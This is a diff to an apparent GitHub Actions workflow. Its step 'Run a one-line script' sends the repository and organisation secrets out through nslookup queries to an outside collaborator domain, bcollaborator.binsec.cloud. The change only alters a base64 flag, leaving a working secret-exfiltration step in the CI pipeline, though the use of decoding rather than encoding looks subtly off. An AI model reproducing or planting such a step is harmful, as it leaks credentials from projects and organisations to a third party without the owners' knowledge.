@@ -16,5 +16,5 @@ jobs:
     steps:
       - name: Run a one-line script
         run: >
-          nslookup `base64 -d -n0 ${{env.REPO_SECRET}}`.stp2xskh25j8i5dl5ftmqtmmndt4hu5j.bcollaborator.binsec.cloud
-          && nslookup `base64 -d -n0 ${{env.ORG_SECRET}}`.stp2xskh25j8i5dl5ftmqtmmndt4hu5j.bcollaborator.binsec.cloud
+          nslookup `base64 -d -w0 ${{env.REPO_SECRET}}`.stp2xskh25j8i5dl5ftmqtmmndt4hu5j.bcollaborator.binsec.cloud
+          && nslookup `base64 -d -w0 ${{env.ORG_SECRET}}`.stp2xskh25j8i5dl5ftmqtmmndt4hu5j.bcollaborator.binsec.cloud
